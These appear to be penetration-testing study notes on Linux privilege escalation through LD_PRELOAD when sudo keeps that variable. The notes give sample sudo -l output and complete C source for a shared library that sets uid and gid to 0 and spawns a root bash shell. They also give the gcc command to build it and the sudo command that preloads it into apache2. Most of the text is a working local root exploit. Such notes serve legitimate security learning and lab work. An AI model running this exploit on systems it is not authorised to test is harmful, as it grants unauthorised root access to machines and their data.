
The `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the `ldd` utility.

---
## LD_PRELOAD Privilege Escalation

We need a user with sudo privileges with the below set:
```sh
sudo -l 
<...SNIP...> env_keep+=LD_PRELOAD 
### env_keep with LD_PRELOAD 

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart 
### any binary executable as sudo
```
``
We can exploit the `LD_PRELOAD` issue to run a custom shared library file. Let's compile the following library:
```C
#include <stdio.h> 
#include <sys/types.h> 
#include <stdlib.h> 
#include <unistd.h> 

void _init() { 
unsetenv("LD_PRELOAD"); 
setgid(0); 
setuid(0); 
system("/bin/bash"); 
}
```

We can compile this as follows:
```sh
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

- `-fPIC` - position-independent code (required for shared libs)
- `-shared` - produce `.so` file
- `-nostartfiles` - avoids standard startup code (keeps it minimal)

We need to `cp` it to `/tmp` and then run as `/tmp` i.e. universally accessible.
```sh
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

- `sudo` executes `/usr/sbin/apache2` as **root**
- If `sudo` is configured to **preserve environment variables**
- Then `LD_PRELOAD` is honoured **in a root context**

---